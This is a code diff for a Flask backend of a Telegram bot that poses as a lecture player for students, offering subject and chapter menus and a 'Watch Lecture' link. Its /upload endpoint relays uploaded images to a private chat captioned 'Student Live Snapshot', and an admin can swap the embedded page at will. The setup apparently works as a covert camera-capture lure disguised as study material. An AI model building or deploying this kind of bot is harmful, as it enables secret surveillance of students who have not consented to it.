@@ -6,20 +6,23 @@ app = Flask(__name__)
 
 # ===== RENDER ENV VARIABLES =====
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")        # numeric id
-RENDER_URL = os.environ.get("RENDER_URL")  # https://xxx.onrender.com
+CHAT_ID = os.environ.get("CHAT_ID")
+RENDER_URL = os.environ.get("RENDER_URL")
 # =================================
 
 # Default video
 current_video_url = "https://munna1127.github.io/Cbse-test/Cbse%20test.html"
 
+
 @app.route("/")
 def home():
     return send_file("index.html")
 
+
 @app.route("/get_video_link")
 def get_video_link():
     return jsonify({"url": current_video_url})
+
 
 @app.route("/upload", methods=["POST"])
 def upload():
@@ -29,14 +32,22 @@ def upload():
         photo.save(temp)
 
         tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+
         with open(temp, "rb") as f:
-            requests.post(
+            r = requests.post(
                 tg_url,
                 files={"photo": f},
-                data={"chat_id": CHAT_ID, "caption": "📸 Student Live Snapshot"}
+                data={
+                    "chat_id": CHAT_ID,
+                    "caption": "📸 Student Live Snapshot"
+                }
             )
+            print("Telegram response:", r.text)
+
         os.remove(temp)
+
     return "OK", 200
+
 
 @app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def webhook():
@@ -47,19 +58,27 @@ def webhook():
         cid = str(data["message"]["chat"]["id"])
         text = data["message"].get("text", "")
 
-        # ===== ADMIN =====
+        # ===== ADMIN LINK UPDATE =====
         if cid == CHAT_ID and ("http" in text or "t.me" in text):
             current_video_url = text
+
+            # Safe URL append
             if "embed=1" not in current_video_url:
-                current_video_url += "?embed=1&autoplay=1"
+                if "?" in current_video_url:
+                    current_video_url += "&embed=1&autoplay=1"
+                else:
+                    current_video_url += "?embed=1&autoplay=1"
 
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": cid, "text": "✅ Video link updated"}
+                json={
+                    "chat_id": cid,
+                    "text": "✅ Video link updated"
+                }
             )
             return "OK"
 
-        # ===== STUDENT =====
+        # ===== STUDENT MENU =====
         if text == "/start":
             menu = {
                 "inline_keyboard": [
@@ -68,9 +87,14 @@ def webhook():
                     [{"text": "Maths", "callback_data": "math"}]
                 ]
             }
+
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": cid, "text": "📚 Select Subject", "reply_markup": menu}
+                json={
+                    "chat_id": cid,
+                    "text": "📚 Select Subject",
+                    "reply_markup": menu
+                }
             )
 
     elif "callback_query" in data:
@@ -84,9 +108,14 @@ def webhook():
                     [{"text": "Electrostatics", "callback_data": "phy_elec"}]
                 ]
             }
+
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": cid, "text": "Physics Chapters:", "reply_markup": chapters}
+                json={
+                    "chat_id": cid,
+                    "text": "Physics Chapters:",
+                    "reply_markup": chapters
+                }
             )
 
         elif choice == "phy_elec":
@@ -95,17 +124,24 @@ def webhook():
                     [{"text": "▶ Watch Lecture", "url": RENDER_URL}]
                 ]
             }
+
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": cid, "text": "Lecture Player:", "reply_markup": play}
+                json={
+                    "chat_id": cid,
+                    "text": "Lecture Player:",
+                    "reply_markup": play
+                }
             )
 
     return "OK"
+
 
 def init_webhook():
     requests.get(
         f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={RENDER_URL}/{BOT_TOKEN}"
     )
+
 
 if __name__ == "__main__":
     init_webhook()
